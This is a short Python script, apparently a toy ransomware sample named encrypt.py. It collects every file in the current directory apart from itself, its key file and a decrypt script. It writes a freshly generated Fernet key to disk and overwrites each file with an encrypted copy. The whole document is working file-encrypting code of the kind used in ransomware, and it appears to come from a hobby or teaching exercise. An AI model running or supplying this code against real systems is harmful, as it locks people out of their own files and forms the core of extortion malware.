#!/usr/bin/env python3 
import os
from cryptography.fernet import Fernet 

files = [] 

for file in os.listdir():
    if file == "encrypt.py" or file =="secret_key.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)
    


key = Fernet.generate_key() 

with open("secret_key.key","wb") as thekey: 
    thekey.write(key)

for file in files: 
    with open(file, "rb") as thefile:
        contents = thefile.read()
    encrypted_contents = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(encrypted_contents)